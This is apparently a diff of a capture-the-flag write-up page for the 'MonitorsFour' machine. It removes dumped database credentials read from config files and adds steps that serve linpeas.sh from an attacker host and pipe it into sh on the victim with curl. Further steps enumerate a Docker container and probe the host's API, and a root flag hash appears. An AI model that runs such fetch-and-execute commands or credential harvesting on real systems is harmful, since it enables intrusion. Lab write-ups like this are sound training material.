@@ -118,7 +118,7 @@ MonitorsFour | ARTIFACTS
             
             
                 <dt>reading time</dt>
-                <dd>4 minutes</dd>
+                <dd>5 minutes</dd>
             
         </dl>
     </section>
@@ -256,28 +256,41 @@ The steps for the reverse shell process on the attacker machine were quite strai
 </p>
 <hr>
 <h4 id="011-linpeas-enumeration">011: Linpeas Enumeration</h4>
-<p>[CVE-2021-22555] Netfilter heap out-of-bounds write</p>
-<p>/var/www/html/cacti/include/vendor/phpseclib/Crypt/RSA.php</p>
-<p>-rwxr-xr-x 1 www-data www-data 97 Sep 13 05:37 /var/www/app/.env
-DB_HOST=mariadb
-DB_PORT=3306
-DB_NAME=monitorsfour_db
-DB_USER=monitorsdbuser
-DB_PASS=f37p2j8f4t0r</p>
-<p>-rwxr-xr-x 1 www-data www-data 7159 Sep 13 05:38 /var/www/html/cacti/include/config.php
-$database_type     = &lsquo;mysql&rsquo;;
-$database_default  = &lsquo;cacti&rsquo;;
-$database_username = &lsquo;cactidbuser&rsquo;;
-$database_password = &lsquo;7pyrf6ly8qx4&rsquo;;
-$database_port     = &lsquo;3306&rsquo;;
-$database_ssl      = false;
-$database_ssl_key  = &lsquo;&rsquo;;
-$database_ssl_cert = &lsquo;&rsquo;;
-$database_ssl_ca   = &lsquo;&rsquo;;
-#$rdatabase_type     = &lsquo;mysql&rsquo;;
-#$rdatabase_default  = &lsquo;cacti&rsquo;;
-#$rdatabase_username = &lsquo;cactiuser&rsquo;;
-#$rdatabase_password = &lsquo;cactiuser&rsquo;;</p>
+<p>A local python server is set up on the attacker at a location where <code>linpeas.sh</code> was located.
+On the victim machine <code>linpeas.sh</code> was requested and then executed for system enumeration</p>
+<ul>
+<li><code>linpeas -h</code> | if <code>linpeas</code> is already installed the command will redirect to the directory where <code>linpeash.sh</code> is</li>
+<li><code>sudo python3 -m http.server 80</code> | run the python server in <code>linpeas</code> directory</li>
+<li><code>curl http://&lt;attacker_ip&gt;/linpeas.sh | sh</code> | on the victim machine do a GET request and then pipe to the execution of the enumeration script</li>
+</ul>
+<p>Based on the provided report there where various potential expoitation methods.
+However one that seemed interesting was <code>/.dockerenv</code>, which signified that the system we had access to was a docker container.
+Additional verification that the victim was a docker container was with the command <code>hostname</code>, which returned a random hex value <code>821fbd6a43fa</code> indicating the first 12 characters of the full docker 64 hex character id.</p>
+<p align="center">
+  <img src="/captures/screens/MonitorsFour/shot-013.png" alt="shot-013">
+</p>
+<hr>
+<h4 id="012-containerization">012: Containerization</h4>
+<p>Furthermore, in /etc/hosts an entry showed a self-mapping for a docker container, confirming the environment is set in a docker gateway bridge.</p>
+<p align="center">
+  <img src="/captures/screens/MonitorsFour/shot-014.png" alt="shot-014">
+</p>
+<hr>
+<h4 id="013-docker-api">013: Docker API</h4>
+<p>As described the victim machine being Windows, it was assumed that the host was a Windows machine.
+
+<a href="https://dev.to/nasrulhazim/how-to-access-your-localhost-api-from-docker-containers-7ai" target="_blank" rel="noopener">https://dev.to/nasrulhazim/how-to-access-your-localhost-api-from-docker-containers-7ai</a>
+ provided a brief guide towards accessing the Docker API through a container.
+<code>host.docker.internal</code> is a resolution which allows access to a host machine, specifically if it is Windows or macOS.
+A probe was made to <code>host.docker.internal</code> with the use of <code>curl</code>, and the name resolution resolved to <code>192.168.65.254</code> on <code>port 80</code>.
+Essentially, the command returned an output that described the container has access to the host&rsquo;s nginx server.</p>
+<ul>
+<li><code>curl -v http://host.docker.internal</code> | switch sets <code>curl</code> to verbose-mode</li>
+</ul>
+<p align="center">
+  <img src="/captures/screens/MonitorsFour/shot-015.png" alt="shot-015">
+</p>
+<hr>
 <ul>
 <li>root: 35713cf72da6c0530e65ce8f42a16e26</li>
 </ul>
